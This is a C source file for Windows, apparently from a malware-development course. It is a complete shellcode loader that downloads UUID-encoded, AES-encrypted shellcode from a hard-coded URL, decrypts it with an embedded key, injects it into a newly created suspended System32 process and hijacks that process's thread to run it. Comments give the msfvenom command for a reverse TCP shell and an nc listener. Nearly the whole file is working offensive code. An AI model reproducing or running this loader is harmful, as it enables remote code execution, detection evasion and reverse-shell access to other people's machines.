#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include <wininet.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "wininet.lib")

#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#define KEYSIZE				32
#define IVSIZE				16

#define NumberOfElements 29
#define PAYLOAD L"http://10.211.55.2:8080/shellreversetcpuuid.txt"

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

unsigned char pKey[] = {
        0xD8, 0x13, 0x4D, 0xCE, 0xEA, 0x2B, 0x5B, 0xE7, 0x1C, 0x5C, 0xB2, 0x62, 0x66, 0x90, 0x25, 0x1D,
        0x3E, 0x31, 0x06, 0x6D, 0xB0, 0xEB, 0xDF, 0x08, 0xB1, 0xB4, 0x62, 0x23, 0xB1, 0x0A, 0xA3, 0xD7 };


unsigned char pIv[] = {
        0xB9, 0x4F, 0x7E, 0x0A, 0x48, 0x5A, 0x73, 0x27, 0x40, 0xC2, 0x8A, 0x3E, 0x29, 0xC3, 0x97, 0x25 };

        // payload ; msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin
        // listner ; nc -nlvp 4444 (on the 192.168.16.111 machine)


typedef struct _AES {

	PBYTE	pPlainText;				// Base address of the plaintext data 
	DWORD	dwPlainSize;			// Size of the plaintext data

	PBYTE	pCipherText;			// Base address of the encrypted data	
	DWORD	dwCipherSize;			// Size of the encrypted data. This can vary from dwPlainSize when there is padding involved.

	PBYTE	pKey;					// The 32 byte key
	PBYTE	pIv;					// The 16 byte IV

}AES, * PAES;

// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

	BOOL				bSTATE = TRUE;

	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;

	ULONG				cbResult = NULL;
	DWORD				dwBlockSize = NULL;
	DWORD				cbKeyObject = NULL;
	PBYTE				pbKeyObject = NULL;

	PBYTE				pbPlainText = NULL;
	DWORD				cbPlainText = NULL,

		// Intializing "hAlgorithm" as AES algorithm Handle
		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating enough memory for the output buffer, cbPlainText
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Running BCryptDecrypt again with pbPlainText as the output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Clean up
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbPlainText != NULL && bSTATE) {
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;

}

// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pCipherText = pCipherTextData,
		.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}


// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
                TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

/*
Parameters:
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId; A pointer to a DWORD that recieves the process ID.
	- hProcess; A pointer to a HANDLE that recieves the process handle.
	- hThread; A pointer to a HANDLE that recieves the thread handle.

Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
*/
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath		[MAX_PATH * 2];
	CHAR					WnDr		[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


/*
	'InjectShellcodeToRemoteProcess' is explained in the "Process Injection - Shellcode beginner" module:
		it inject the input payload into 'hProcess' and return the base address of where did the payload got written
*/

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T	sNumberOfBytesWritten	= NULL;
	DWORD	dwOldProtection			= NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}



/*

Parameters:
	- hThread; suspended thread handle
	- pAddress; base address of the shellcode written to the process running 'hThread'

Performs thread hijacking, and resumes the thread after to run the payload at 'pAddress'

*/
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT		ThreadCtx = {
			.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	 // updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\n\t[#] Press <Enter> To Run ... ");
	getchar();

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
                hUrl = NULL;

    // Read and store the UUIDs from the URL without null terminators
    char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
    DWORD bytesRead;

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = InternetOpenW(L"EinAgent", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    for (int i = 0; i < NumberOfElements; i++) {
        if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        // Allocate memory for the UUID and copy the buffer
        UUID[i] = (char*)malloc(bytesRead);
        if (UUID[i] == NULL) {
            perror("Error allocating memory");
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        memcpy(UUID[i], buffer, bytesRead);
    }


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);									// Closing handle 
    if (hUrl)
        InternetCloseHandle(hUrl);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    return bSTATE;
}




int main(int argc, char* argv[]) {

	HANDLE		hProcess	= NULL,
			hThread		= NULL;
	
	DWORD		dwProcessId = NULL;
	PVOID		pAddress	= NULL;

        	// Checking command line arguments
	if (argc < 2) {
		printf("[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}
        
        // Convert argv[1] to LPCSTR if needed
        LPCSTR arg1 = argv[1];

//	creating target remote process (in suspended state)
	wprintf("[i] Creating \"%s\" Process ... ", argv[1]);
	if (!CreateSuspendedProcess(arg1, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");


        char* UuidArray[NumberOfElements];
        PBYTE	Bytes = NULL;
        SIZE_T	Size = NULL;

        	 // Reading the payload 
        if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
                return -1;
        }

        for (int i = 0; i < NumberOfElements; i++) {
        printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
        }

        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
                return -1;
        }

        // defining two variables, that will be used in SimpleDecryption, (the output buffer and its size)
	PVOID	pPlaintext = NULL;
	DWORD	dwPlainSize = NULL;

        if (!SimpleDecryption((PVOID)Bytes, (DWORD)Size, pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}

        printf("[i] Bytes : 0x%p \n", pPlaintext);

   
// injecting the payload and getting the base address of it
	printf("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, (PBYTE)pPlaintext, (SIZE_T)dwPlainSize, &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

	
// performing thread hijacking to run the payload
	printf("[i] Hijacking The Target Thread To Run Our Shellcode ... ");
	if (!HijackThread(hThread, pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
